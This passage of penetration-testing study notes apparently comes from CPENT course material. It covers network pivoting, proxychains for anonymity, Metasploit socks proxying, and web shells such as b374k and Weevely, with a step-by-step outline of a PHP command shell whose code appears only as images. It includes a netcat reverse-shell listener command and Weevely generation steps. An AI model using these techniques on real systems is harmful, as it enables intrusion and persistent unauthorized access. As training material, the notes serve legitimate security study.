  auxiliary/scanner/smb/smb_version
  ```

  ![](/home/sherwinowen/Documents/my_tutorials/CPENT/images/image-20210829063636911.png)

  

### Exploit through the Session

- Same process isnce we have the route set up

![image-20210829063900969](/home/sherwinowen/Documents/my_tutorials/CPENT/images/image-20210829063900969.png)

### Double Pivot 

- The process is the same as covered
- Access a machine via the first victim and then on the 2nd victim discover two network cards
- The 2nd network card represents the next network to attack and in a sense, this is a double pivot



### Proxychains

- Sometimes we need to remain untraceable while performing a pen test activity. Proxychains helps us
  by allowing us to use an intermediary system whose IP can be left in the logs of the system without the worry of it tracing back to us
- We can setup a proxy via the tor network or a socks implementation

**Steps to setup**

1. Modify the configuration file for our proxychains
   /etc/proxychains.conf

   Can run any command through the proxy

   - Can setup proxy for tor as well as socks, http etc.

   ![image-20210829064316513](/home/sherwinowen/Documents/my_tutorials/CPENT/images/image-20210829064316513.png)

### Metasploit Proxy Module

```
use auxiliary/server/socks4a
```

![image-20210829065214741](/home/sherwinowen/Documents/my_tutorials/CPENT/images/image-20210829065214741.png)

### Usage

- Once you have set the proxy all commands can be used through it using proxychains through the
  port that you have setup

  ```
  proxychains nmap -sS <IP>
  ```

  ![image-20210829065420453](/home/sherwinowen/Documents/my_tutorials/CPENT/images/image-20210829065420453.png)

  

### Web Shells

1. Malicious script used by an attacker with the intent to escalate and maintain persistent access on an already compromised web application

2. **Persistent Remote Access**

   A web-shell usually contains a backdoor which allows an attacker to remotely access and possibly, control a server at anytime

3. A web-shell can be used for pivoting inside or outside a network

#### b734k

This PHP Shell is a useful tool for system or web administrator to do remote management without using cpanel, connecting using ssh, ftp etc. All actions take place within a web browser

- File manager (view, edit, rename, delete, upload, download, archiver, etc)

- Search file, file content, folder (also using regex)
- Command execution
- Script execution (php, perl, python, ruby, java, node.js, ¢)
- Give you shell via bind/reverse shell connect

#### Create the Shell

- Upload it to the website via a discovered weakness
- Run the shell

![image-20210829065944617](/home/sherwinowen/Documents/my_tutorials/CPENT/images/image-20210829065944617.png)

#### Shell Interface

- Create the listener on your attacker machine

  ``` 
  nc -l -v -p 13213
  ```

  ![image-20210829070256096](/home/sherwinowen/Documents/my_tutorials/CPENT/images/image-20210829070256096.png)

#### Connect to the shell

- Click the Run button in the reverse Shell section of the Web Shell
- This will establish a reverse shell connection to the attacker PC

![image-20210829070409305](/home/sherwinowen/Documents/my_tutorials/CPENT/images/image-20210829070409305.png)

### Weevely

Simulates a Telnet session and allows the tester or attacker to take advantage of more than 30 modules 
for post-exploitation tasks

- Browsing the target filesystem
- File transfer to and from the compromised systems
- Performing audits for common server misconfigurations
- Brute-forcing SQL accounts through the target system
- Spawning reverse TCP shells
- Executing commands on remote systems that have been compromised, even if PHP security restrictions have been applied

Weevely endeavors to hide communications in HTTP cookies to avoid detection 

```
weevely generate <password><path>
```

- This will create the file weevely.php in the root directory

![image-20210829071815597](/home/sherwinowen/Documents/my_tutorials/CPENT/images/image-20210829071815597.png)

### Create a Custom Shell

- Requires command execution
- Form handling
- Conditionals
- Focus

![image-20210829071933127](/home/sherwinowen/Documents/my_tutorials/CPENT/images/image-20210829071933127.png)

#### Create the Form

- We begin by creating our form
- We specify that our submit method is going to be POST

![image-20210829072148761](/home/sherwinowen/Documents/my_tutorials/CPENT/images/image-20210829072148761.png)

#### Focus

- We do not want to have to scroll and chase the form, so we use focus code using Javacript

![image-20210829072314617](/home/sherwinowen/Documents/my_tutorials/CPENT/images/image-20210829072314617.png)

#### Basic PHP Shell

![image-20210829072410477](/home/sherwinowen/Documents/my_tutorials/CPENT/images/image-20210829072410477.png)

#### HTML PArt

1. This is the start of HTML code

   ![image-20210829072544130](/home/sherwinowen/Documents/my_tutorials/CPENT/images/image-20210829072544130.png)

2. Create a HEAD section for the HTML page and declare “Simple PHP Shell” as its title

   ![image-20210829072610159](/home/sherwinowen/Documents/my_tutorials/CPENT/images/image-20210829072610159.png)

3. Create BODY section for the HTML page

   ![image-20210829072635688](/home/sherwinowen/Documents/my_tutorials/CPENT/images/image-20210829072635688.png)

4. Create a form which calls shell.php. Please note, this assumes that this script is saved as shell.php

  ![image-20210829072804697](/home/sherwinowen/Documents/my_tutorials/CPENT/images/image-20210829072804697.png)

5. Create a text input field with the name of “c”

   ![image-20210829072857102](/home/sherwinowen/Documents/my_tutorials/CPENT/images/image-20210829072857102.png)

6. Create a button with the name of “submit” with the label “Command”

   ![image-20210829072922874](/home/sherwinowen/Documents/my_tutorials/CPENT/images/image-20210829072922874.png)

7. Close the form

   ![image-20210829072956896](/home/sherwinowen/Documents/my_tutorials/CPENT/images/image-20210829072956896.png)

#### PHP Part

1. The PHP code is embedded in the HTML code and the start is marked by
   ![image-20210829073145722](/home/sherwinowen/Documents/my_tutorials/CPENT/images/image-20210829073145722.png)

2. Check if the form has been submitted. If the URL variable ‘submit’ exists then the user has clicked the “Command” button. if not do nothing
   ![image-20210829073255126](/home/sherwinowen/Documents/my_tutorials/CPENT/images/image-20210829073255126.png)

3. Declare “$c” as a variable and set it to the contents of the input field ‘c’ from the HTML form
   ![image-20210829073314573](/home/sherwinowen/Documents/my_tutorials/CPENT/images/image-20210829073314573.png)

4. Declare “$output” as a variable to hold the return value from the shell_exec() function. “$c” is the command that the user entered in the input field
   ![image-20210829073338472](/home/sherwinowen/Documents/my_tutorials/CPENT/images/image-20210829073338472.png)

5. Show the result
   ![image-20210829073358672](/home/sherwinowen/Documents/my_tutorials/CPENT/images/image-20210829073358672.png)

6. Declare the end for the PHP code
   ![image-20210829073423773](/home/sherwinowen/Documents/my_tutorials/CPENT/images/image-20210829073423773.png)



### Document the Result

Note down the IP addresses, unnecessary open ports, services, unpatched systems, weak passwords, and so on found during internal penetration testing.

